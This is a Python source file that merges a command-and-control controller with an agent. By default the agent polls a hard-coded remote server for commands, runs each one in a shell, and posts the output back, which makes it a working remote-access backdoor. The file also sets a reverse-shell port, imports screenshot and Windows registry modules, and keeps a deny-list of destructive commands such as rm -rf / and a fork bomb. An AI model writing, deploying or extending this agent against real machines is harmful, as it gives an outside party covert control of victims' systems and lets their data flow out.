"""
Merged Python Agent - Combined from all repository Python files
Includes: config.py, logger.py, security.py, start.py, test_agent.py functionality

This merged file contains all the functionality from the separate Python modules
for easier deployment and management.
"""

# =============================================================================
# IMPORTS SECTION - All imports from merged modules
# =============================================================================

# Standard library imports
import os
import sys
import time
import uuid
import json
import secrets
import hashlib
import hmac
import logging
import logging.handlers
import subprocess
import threading
import random
import re
from datetime import datetime
from pathlib import Path
from typing import Optional, Dict, Callable, Any
from functools import wraps
from collections import defaultdict, deque

# Third-party imports
import requests
try:
    from flask import Flask, request, jsonify, g, make_response
except ImportError:
    print("Warning: Flask not available - web server features disabled")
    Flask = None

try:
    from dotenv import load_dotenv
except ImportError:
    load_dotenv = None

try:
    import mss
    import numpy as np
    import cv2
except ImportError:
    print("Warning: Screenshot libraries not available")

try:
    import win32api
    import win32con
    import win32security
    import win32process
    import winreg
    WINDOWS_MODULES_AVAILABLE = True
except ImportError:
    WINDOWS_MODULES_AVAILABLE = False

# =============================================================================
# CONFIG MODULE - Configuration management
# =============================================================================

class Config:
    """Configuration class for the controller"""
    
    # Security settings
    API_KEY: str = os.getenv('API_KEY', secrets.token_urlsafe(32))
    SECRET_KEY: str = os.getenv('SECRET_KEY', secrets.token_urlsafe(32))
    REQUIRE_AUTH: bool = os.getenv('REQUIRE_AUTH', 'True').lower() == 'true'
    
    # Network settings
    HOST: str = os.getenv('HOST', '127.0.0.1')  # Changed from 0.0.0.0 for security
    PORT: int = int(os.getenv('PORT', '8080'))
    REVERSE_SHELL_PORT: int = int(os.getenv('REVERSE_SHELL_PORT', '9999'))
    
    # Agent settings
    AGENT_TIMEOUT_SECONDS: int = int(os.getenv('AGENT_TIMEOUT_SECONDS', '60'))
    CLEANUP_INTERVAL_SECONDS: int = int(os.getenv('CLEANUP_INTERVAL_SECONDS', '30'))
    MAX_AGENTS: int = int(os.getenv('MAX_AGENTS', '100'))
    
    # Rate limiting
    RATE_LIMIT_PER_MINUTE: int = int(os.getenv('RATE_LIMIT_PER_MINUTE', '60'))
    MAX_COMMAND_LENGTH: int = int(os.getenv('MAX_COMMAND_LENGTH', '1000'))
    MAX_UPLOAD_SIZE_MB: int = int(os.getenv('MAX_UPLOAD_SIZE_MB', '10'))
    
    # Logging
    LOG_LEVEL: str = os.getenv('LOG_LEVEL', 'INFO')
    LOG_FILE: str = os.getenv('LOG_FILE', 'controller.log')
    
    # Production settings
    DEBUG: bool = os.getenv('DEBUG', 'False').lower() == 'true'
    
    @classmethod
    def is_production(cls) -> bool:
        """Check if running in production mode"""
        return not cls.DEBUG
    
    @classmethod
    def validate_config(cls) -> bool:
        """Validate configuration settings"""
        errors = []
        
        if cls.REQUIRE_AUTH and len(cls.API_KEY) < 16:
            errors.append("API_KEY must be at least 16 characters")
        
        try:
            if cls.PORT < 1024 and os.getuid() != 0:
                errors.append("Port < 1024 requires root privileges")
        except AttributeError:
            # Windows doesn't have getuid
            pass
        
        if cls.MAX_UPLOAD_SIZE_MB > 100:
            errors.append("MAX_UPLOAD_SIZE_MB should not exceed 100MB")
        
        if errors:
            print("Configuration errors:")
            for error in errors:
                print(f"  - {error}")
            return False
        
        return True
    
    @classmethod
    def print_config(cls) -> None:
        """Print non-sensitive configuration"""
        print("=== Controller Configuration ===")
        print(f"Host: {cls.HOST}")
        print(f"Port: {cls.PORT}")
        print(f"Reverse Shell Port: {cls.REVERSE_SHELL_PORT}")
        print(f"Authentication: {'Enabled' if cls.REQUIRE_AUTH else 'Disabled'}")
        print(f"Debug Mode: {'Enabled' if cls.DEBUG else 'Disabled'}")
        print(f"Max Agents: {cls.MAX_AGENTS}")
        print(f"Agent Timeout: {cls.AGENT_TIMEOUT_SECONDS}s")
        print(f"Rate Limit: {cls.RATE_LIMIT_PER_MINUTE}/min")
        print("===============================")

# Create global config instance
config = Config()

# =============================================================================
# LOGGER MODULE - Centralized logging system
# =============================================================================

class SecurityLogger:
    """Enhanced logger with security event tracking"""
    
    def __init__(self, name: str, log_file: str = 'controller.log', level: str = 'INFO'):
        self.logger = logging.getLogger(name)
        self.logger.setLevel(getattr(logging, level.upper()))
        
        # Prevent duplicate handlers
        if self.logger.hasHandlers():
            self.logger.handlers.clear()
        
        # Create formatters
        file_formatter = logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(funcName)s:%(lineno)d - %(message)s'
        )
        console_formatter = logging.Formatter(
            '%(asctime)s - %(levelname)s - %(message)s'
        )
        
        # Console handler
        console_handler = logging.StreamHandler(sys.stdout)
        console_handler.setLevel(logging.INFO)
        console_handler.setFormatter(console_formatter)
        self.logger.addHandler(console_handler)
        
        # File handler with rotation
        try:
            Path(log_file).parent.mkdir(parents=True, exist_ok=True)
            file_handler = logging.handlers.RotatingFileHandler(
                log_file, maxBytes=10*1024*1024, backupCount=5
            )
            file_handler.setLevel(logging.DEBUG)
            file_handler.setFormatter(file_formatter)
            self.logger.addHandler(file_handler)
        except Exception as e:
            self.logger.error(f"Failed to create file handler: {e}")
    
    def info(self, message: str, agent_id: Optional[str] = None, extra: Optional[dict] = None):
        """Log info message"""
        msg = self._format_message(message, agent_id, extra)
        self.logger.info(msg)
    
    def warning(self, message: str, agent_id: Optional[str] = None, extra: Optional[dict] = None):
        """Log warning message"""
        msg = self._format_message(message, agent_id, extra)
        self.logger.warning(msg)
    
    def error(self, message: str, agent_id: Optional[str] = None, extra: Optional[dict] = None):
        """Log error message"""
        msg = self._format_message(message, agent_id, extra)
        self.logger.error(msg)
    
    def debug(self, message: str, agent_id: Optional[str] = None, extra: Optional[dict] = None):
        """Log debug message"""
        msg = self._format_message(message, agent_id, extra)
        self.logger.debug(msg)
    
    def security_event(self, event_type: str, message: str, agent_id: Optional[str] = None, 
                      severity: str = 'INFO', extra: Optional[dict] = None):
        """Log security events with special formatting"""
        event_data = {
            'event_type': event_type,
            'severity': severity,
            'timestamp': datetime.utcnow().isoformat(),
            'agent_id': agent_id,
            'message': message
        }
        if extra:
            event_data.update(extra)
        
        formatted_msg = f"SECURITY_EVENT: {event_data}"
        
        if severity.upper() == 'CRITICAL':
            self.logger.critical(formatted_msg)
        elif severity.upper() == 'HIGH':
            self.logger.error(formatted_msg)
        elif severity.upper() == 'MEDIUM':
            self.logger.warning(formatted_msg)
        else:
            self.logger.info(formatted_msg)
    
    def agent_activity(self, action: str, agent_id: str, success: bool = True, extra: Optional[dict] = None):
        """Log agent-specific activities"""
        status = "SUCCESS" if success else "FAILED"
        msg = f"AGENT_ACTIVITY: {action} - Agent: {agent_id} - Status: {status}"
        if extra:
            msg += f" - Extra: {extra}"
        
        if success:
            self.logger.info(msg)
        else:
            self.logger.warning(msg)
    
    def command_execution(self, command: str, agent_id: str, success: bool = True):
        """Log command executions for auditing"""
        status = "SUCCESS" if success else "FAILED"
        # Sanitize command for logging (remove potentially sensitive data)
        safe_command = self._sanitize_command(command)
        msg = f"COMMAND_EXEC: Agent: {agent_id} - Command: {safe_command} - Status: {status}"
        self.logger.info(msg)
    
    def connection_event(self, event: str, client_ip: str, agent_id: Optional[str] = None):
        """Log connection events"""
        msg = f"CONNECTION: {event} - IP: {client_ip}"
        if agent_id:
            msg += f" - Agent: {agent_id}"
        self.logger.info(msg)
    
    def _format_message(self, message: str, agent_id: Optional[str], extra: Optional[dict]) -> str:
        """Format log message with optional agent ID and extra data"""
        if agent_id:
            message = f"[Agent: {agent_id}] {message}"
        if extra:
            message += f" - Extra: {extra}"
        return message
    
    def _sanitize_command(self, command: str) -> str:
        """Sanitize commands for safe logging"""
        # Truncate very long commands
        if len(command) > 100:
            command = command[:97] + "..."
        
        # Remove potentially sensitive patterns
        sensitive_patterns = ['password', 'token', 'key', 'secret', 'auth']
        for pattern in sensitive_patterns:
            if pattern in command.lower():
                return "[SENSITIVE_COMMAND_REDACTED]"
        
        return command

# Create global logger instances
controller_logger = SecurityLogger('controller')
agent_logger = SecurityLogger('agent')

# Convenience functions
def log_info(message: str, agent_id: Optional[str] = None, extra: Optional[dict] = None):
    controller_logger.info(message, agent_id, extra)

def log_warning(message: str, agent_id: Optional[str] = None, extra: Optional[dict] = None):
    controller_logger.warning(message, agent_id, extra)

def log_error(message: str, agent_id: Optional[str] = None, extra: Optional[dict] = None):
    controller_logger.error(message, agent_id, extra)

def log_security_event(event_type: str, message: str, agent_id: Optional[str] = None, 
                      severity: str = 'INFO', extra: Optional[dict] = None):
    controller_logger.security_event(event_type, message, agent_id, severity, extra)

# =============================================================================
# SECURITY MODULE - Security middleware and utilities
# =============================================================================

class RateLimiter:
    """Simple in-memory rate limiter"""
    
    def __init__(self):
        self.requests = defaultdict(deque)
    
    def is_allowed(self, client_ip: str, max_requests: int = None, window_seconds: int = 60) -> bool:
        """Check if request is within rate limit"""
        if max_requests is None:
            max_requests = config.RATE_LIMIT_PER_MINUTE
        
        now = time.time()
        # Clean old requests
        while (self.requests[client_ip] and 
               now - self.requests[client_ip][0] > window_seconds):
            self.requests[client_ip].popleft()
        
        # Check current count
        if len(self.requests[client_ip]) >= max_requests:
            return False
        
        # Add current request
        self.requests[client_ip].append(now)
        return True

class InputValidator:
    """Input validation utilities"""
    
    @staticmethod
    def validate_agent_id(agent_id: str) -> bool:
        """Validate agent ID format"""
        if not agent_id or len(agent_id) < 8 or len(agent_id) > 64:
            return False
        # Allow alphanumeric and hyphens only
        return re.match(r'^[a-zA-Z0-9\-]+$', agent_id) is not None
    
    @staticmethod
    def validate_command(command: str) -> tuple[bool, str]:
        """Validate command input"""
        if not command:
            return False, "Command cannot be empty"
        
        if len(command) > config.MAX_COMMAND_LENGTH:
            return False, f"Command too long (max {config.MAX_COMMAND_LENGTH} chars)"
        
        # Check for potentially dangerous commands
        dangerous_patterns = [
            r'rm\s+-rf\s+/',
            r'del\s+/[qsf]',
            r'format\s+c:',
            r'dd\s+if=',
            r':(){ :|:& };:',  # Fork bomb
        ]
        
        for pattern in dangerous_patterns:
            if re.search(pattern, command, re.IGNORECASE):
                return False, "Command contains potentially dangerous patterns"
        
        return True, ""
    
    @staticmethod
    def sanitize_filename(filename: str) -> str:
        """Sanitize filename for safe handling"""
        # Remove directory traversal attempts
        filename = filename.replace('..', '').replace('/', '').replace('\\', '')
        # Keep only safe characters
        filename = re.sub(r'[^a-zA-Z0-9._-]', '_', filename)
        return filename[:100]  # Limit length

class AuthManager:
    """Authentication and authorization manager"""
    
    @staticmethod
    def validate_api_key(api_key: str) -> bool:
        """Validate API key"""
        if not config.REQUIRE_AUTH:
            return True
        
        if not api_key:
            return False
        
        # Constant-time comparison to prevent timing attacks
        return hmac.compare_digest(api_key, config.API_KEY)
    
    @staticmethod
    def get_client_ip() -> str:
        """Get client IP address safely"""
        if Flask and request:
            # Check for forwarded headers (behind proxy)
            if request.headers.get('X-Forwarded-For'):
                return request.headers.get('X-Forwarded-For').split(',')[0].strip()
            elif request.headers.get('X-Real-IP'):
                return request.headers.get('X-Real-IP')
            else:
                return request.remote_addr or 'unknown'
        return 'unknown'

# Global instances
rate_limiter = RateLimiter()
auth_manager = AuthManager()
validator = InputValidator()

# Security decorators (only work if Flask is available)
if Flask:
    def require_auth(f: Callable) -> Callable:
        """Decorator to require API key authentication"""
        @wraps(f)
        def decorated_function(*args, **kwargs):
            if not config.REQUIRE_AUTH:
                return f(*args, **kwargs)
            
            # Get API key from header or query parameter
            api_key = (request.headers.get('X-API-Key') or 
                      request.headers.get('Authorization', '').replace('Bearer ', '') or
                      request.args.get('api_key'))
            
            if not auth_manager.validate_api_key(api_key):
                client_ip = auth_manager.get_client_ip()
                log_security_event(
                    'UNAUTHORIZED_ACCESS', 
                    f'Invalid API key from {client_ip}',
                    severity='HIGH',
                    extra={'endpoint': request.endpoint, 'ip': client_ip}
                )
                return jsonify({'error': 'Invalid API key'}), 401
            
            return f(*args, **kwargs)
        return decorated_function
    
    def rate_limit(max_requests: int = None):
        """Decorator for rate limiting"""
        def decorator(f: Callable) -> Callable:
            @wraps(f)
            def decorated_function(*args, **kwargs):
                client_ip = auth_manager.get_client_ip()
                
                if not rate_limiter.is_allowed(client_ip, max_requests):
                    log_security_event(
                        'RATE_LIMIT_EXCEEDED',
                        f'Rate limit exceeded for {client_ip}',
                        severity='MEDIUM',
                        extra={'endpoint': request.endpoint, 'ip': client_ip}
                    )
                    return jsonify({'error': 'Rate limit exceeded'}), 429
                
                return f(*args, **kwargs)
            return decorated_function
        return decorator

# =============================================================================
# STARTUP UTILITIES - From start.py
# =============================================================================

def generate_secure_keys():
    """Generate secure API keys if not provided"""
    env_file = Path('.env')
    
    if not env_file.exists():
        print("Creating .env file with secure defaults...")
        
        api_key = secrets.token_urlsafe(32)
        secret_key = secrets.token_urlsafe(32)
        
        env_content = f"""# Auto-generated secure configuration
API_KEY={api_key}
SECRET_KEY={secret_key}
REQUIRE_AUTH=True
HOST=127.0.0.1
PORT=8080
DEBUG=False
LOG_LEVEL=INFO
"""
        
        env_file.write_text(env_content)
        print(f"✓ Generated secure .env file")
        print(f"✓ API Key: {api_key}")
        print("⚠️  Save this API key - you'll need it to access the controller!")
        
        # Reload config after creating .env
        if load_dotenv:
            load_dotenv()
        return True
    
    return False

def check_security():
    """Perform security checks"""
    issues = []
    
    # Check API key strength
    if config.REQUIRE_AUTH and len(config.API_KEY) < 16:
        issues.append("API_KEY is too short (minimum 16 characters)")
    
    # Check if running as root (Unix-like systems)
    try:
        if os.getuid() == 0:
            issues.append("Running as root is not recommended")
    except AttributeError:
        # Windows doesn't have getuid
        pass
    
    # Check debug mode in production
    if config.DEBUG and config.is_production():
        issues.append("DEBUG mode should be disabled in production")
    
    # Check host binding
    if config.HOST == '0.0.0.0':
        issues.append("Binding to 0.0.0.0 exposes the service to all networks")
    
    if issues:
        print("\n⚠️  SECURITY WARNINGS:")
        for issue in issues:
            print(f"   • {issue}")
        
        if not config.DEBUG:
            response = input("\nContinue anyway? (y/N): ")
            if response.lower() != 'y':
                sys.exit(1)
    
    return len(issues) == 0

def setup_directories():
    """Create necessary directories"""
    directories = [
        Path('logs'),
        Path('uploads'),
        Path('downloads'),
    ]
    
    for directory in directories:
        directory.mkdir(exist_ok=True)
        print(f"✓ Created directory: {directory}")

def validate_environment():
    """Validate the runtime environment"""
    # Check Python version
    if sys.version_info < (3, 8):
        print("❌ Python 3.8+ is required")
        sys.exit(1)
    
    # Check critical imports
    required_modules = ['requests']
    missing_modules = []
    
    for module in required_modules:
        try:
            __import__(module)
        except ImportError:
            missing_modules.append(module)
    
    if missing_modules:
        print(f"❌ Missing required modules: {missing_modules}")
        print("Install them with: pip install -r requirements.txt")
        sys.exit(1)
    
    print("✓ Environment validation passed")

# =============================================================================
# CONNECTIVITY TEST UTILITIES - From test_agent.py
# =============================================================================

def test_basic_connectivity(server_url: str):
    """Test basic HTTP connectivity to the controller"""
    print(f"Testing connectivity to {server_url}...")
    
    try:
        # Test basic connection
        response = requests.get(f"{server_url}/", timeout=10)
        print(f"✓ Basic connection successful (Status: {response.status_code})")
        return True
    except requests.exceptions.RequestException as e:
        print(f"❌ Basic connection failed: {e}")
        return False

def test_agent_endpoints(server_url: str, agent_id: str):
    """Test agent-specific endpoints"""
    print(f"Testing agent endpoints with ID: {agent_id}")
    
    try:
        # Test get_task endpoint
        response = requests.get(f"{server_url}/get_task/{agent_id}", timeout=10)
        if response.status_code == 200:
            data = response.json()
            print(f"✓ get_task endpoint works (Command: {data.get('command', 'None')})")
        else:
            print(f"⚠️ get_task returned status {response.status_code}")
        
        # Test post_output endpoint
        test_output = {"output": "Test output from connectivity checker"}
        response = requests.post(
            f"{server_url}/post_output/{agent_id}",
            json=test_output,
            timeout=10
        )
        if response.status_code == 200:
            print("✓ post_output endpoint works")
        else:
            print(f"⚠️ post_output returned status {response.status_code}")
        
        return True
        
    except requests.exceptions.RequestException as e:
        print(f"❌ Agent endpoint test failed: {e}")
        return False

# =============================================================================
# AGENT FUNCTIONALITY - Core agent features
# =============================================================================

class PythonAgent:
    """Main agent class with all functionality"""
    
    def __init__(self, server_url: str = "https://agent-controller.onrender.com"):
        self.server_url = server_url
        self.agent_id = f"agent-{str(uuid.uuid4())[:8]}"
        self.is_running = False
        self.last_checkin = None
        
        # Initialize logging
        self.logger = SecurityLogger(f'agent-{self.agent_id}')
        
        print(f"🤖 Python Agent initialized")
        print(f"   Agent ID: {self.agent_id}")
        print(f"   Server: {self.server_url}")
    
    def start(self):
        """Start the agent main loop"""
        print("🚀 Starting agent...")
        self.is_running = True
        
        # Test connectivity first
        if not test_basic_connectivity(self.server_url):
            print("❌ Failed to connect to server")
            return False
        
        # Run main loop
        try:
            while self.is_running:
                self._agent_loop()
                time.sleep(5)  # Poll every 5 seconds
        except KeyboardInterrupt:
            print("\n👋 Agent stopped by user")
        except Exception as e:
            print(f"❌ Agent error: {e}")
            self.logger.error(f"Agent error: {e}")
        finally:
            self.stop()
        
        return True
    
    def stop(self):
        """Stop the agent"""
        self.is_running = False
        print("🛑 Agent stopped")
    
    def _agent_loop(self):
        """Main agent loop - get and execute commands"""
        try:
            # Get task from server
            response = requests.get(
                f"{self.server_url}/get_task/{self.agent_id}",
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                command = data.get("command", "").strip()
                
                if command and command != "sleep":
                    print(f"📨 Received command: {command}")
                    result = self._execute_command(command)
                    self._send_result(result)
                
                self.last_checkin = time.time()
            else:
                print(f"⚠️ Server returned status {response.status_code}")
                
        except requests.exceptions.RequestException as e:
            print(f"❌ Communication error: {e}")
        except Exception as e:
            print(f"❌ Agent loop error: {e}")
            self.logger.error(f"Agent loop error: {e}")
    
    def _execute_command(self, command: str) -> str:
        """Execute a command and return the result"""
        try:
            # Validate command
            is_valid, error_msg = validator.validate_command(command)
            if not is_valid:
                return f"Command validation failed: {error_msg}"
            
            # Log command execution
            self.logger.command_execution(command, self.agent_id, True)
            
            # Execute command
            if command.startswith("cd "):
                # Handle directory changes
                path = command[3:].strip()
                try:
                    os.chdir(path)
                    return f"Changed directory to: {os.getcwd()}"
                except Exception as e:
                    return f"Failed to change directory: {e}"
            
            elif command == "pwd" or command == "cd":
                return f"Current directory: {os.getcwd()}"
            
            elif command.startswith("python ") or command.startswith("python3 "):
                # Execute Python scripts
                result = subprocess.run(
                    command, shell=True, capture_output=True, 
                    text=True, timeout=30
                )
                output = result.stdout + result.stderr
                return output or "Command executed successfully"
            
            else:
                # Execute system commands
                result = subprocess.run(
                    command, shell=True, capture_output=True, 
                    text=True, timeout=30
                )
                output = result.stdout + result.stderr
                return output or "Command executed successfully"
        
        except subprocess.TimeoutExpired:
            return "Command timed out (30s limit)"
        except Exception as e:
            self.logger.command_execution(command, self.agent_id, False)
            return f"Command execution failed: {e}"
    
    def _send_result(self, result: str):
        """Send command result back to server"""
        try:
            response = requests.post(
                f"{self.server_url}/post_output/{self.agent_id}",
                json={"output": result},
                timeout=10
            )
            
            if response.status_code == 200:
                print("✓ Result sent successfully")
            else:
                print(f"⚠️ Failed to send result (Status: {response.status_code})")
                
        except requests.exceptions.RequestException as e:
            print(f"❌ Failed to send result: {e}")

# =============================================================================
# MAIN EXECUTION
# =============================================================================

def main_startup():
    """Main startup function for controller mode"""
    print("🚀 Starting C2 Controller...")
    print("=" * 50)
    
    # Load environment variables if available
    if load_dotenv:
        load_dotenv()
    
    # Generate keys if needed
    keys_generated = generate_secure_keys()
    if keys_generated:
        print("\n" + "=" * 50)
    
    # Validate environment
    validate_environment()
    
    # Validate configuration
    if not config.validate_config():
        sys.exit(1)
    
    # Setup directories
    setup_directories()
    
    # Security checks
    check_security()
    
    # Print configuration
    config.print_config()
    
    # Log startup
    log_security_event(
        'SYSTEM_STARTUP',
        'Controller starting up',
        severity='INFO',
        extra={
            'host': config.HOST,
            'port': config.PORT,
            'auth_enabled': config.REQUIRE_AUTH,
            'debug_mode': config.DEBUG
        }
    )
    
    print("\n🔒 Security features enabled:")
    print(f"   • Authentication: {'✓' if config.REQUIRE_AUTH else '❌'}")
    print(f"   • Rate limiting: ✓")
    print(f"   • Input validation: ✓")
    print(f"   • Security logging: ✓")
    print(f"   • Request auditing: ✓")
    
    if config.REQUIRE_AUTH:
        print(f"\n🔑 API Key required for access:")
        print(f"   • Use header: X-API-Key: {config.API_KEY}")
        print(f"   • Or URL param: ?api_key={config.API_KEY}")

def main_agent():
    """Main function for agent mode"""
    # Configuration
    SERVER_URL = os.getenv('SERVER_URL', "https://agent-controller.onrender.com")
    
    print("🤖 Starting Python Agent...")
    print("=" * 40)
    
    # Create and start agent
    agent = PythonAgent(SERVER_URL)
    agent.start()

def main_test():
    """Main function for connectivity testing"""
    SERVER_URL = os.getenv('SERVER_URL', "https://agent-controller.onrender.com")
    TEST_AGENT_ID = f"test-{str(uuid.uuid4())[:8]}"
    
    print("🧪 Agent Connectivity Test")
    print("=" * 40)
    
    # Test 1: Basic connectivity
    if not test_basic_connectivity(SERVER_URL):
        print("\n❌ Basic connectivity failed. Check your internet connection and server URL.")
        return
    
    print()
    
    # Test 2: Agent endpoints
    if not test_agent_endpoints(SERVER_URL, TEST_AGENT_ID):
        print("\n❌ Agent endpoint tests failed.")
        return
    
    print("\n🎉 All tests passed! Agent should be able to connect successfully.")
    print(f"\nTo test with real agent:")
    print(f"1. Set SERVER_URL environment variable to: {SERVER_URL}")
    print(f"2. Run: python python_agent.py --agent")
    print(f"3. Check the controller dashboard for your agent")

if __name__ == "__main__":
    # Parse command line arguments
    if len(sys.argv) > 1:
        mode = sys.argv[1].lower()
        
        if mode == "--controller" or mode == "-c":
            main_startup()
        elif mode == "--agent" or mode == "-a":
            main_agent()
        elif mode == "--test" or mode == "-t":
            main_test()
        else:
            print("Usage:")
            print("  python python_agent.py --controller  # Start controller")
            print("  python python_agent.py --agent       # Start agent")
            print("  python python_agent.py --test        # Test connectivity")
    else:
        # Default to agent mode
        main_agent()
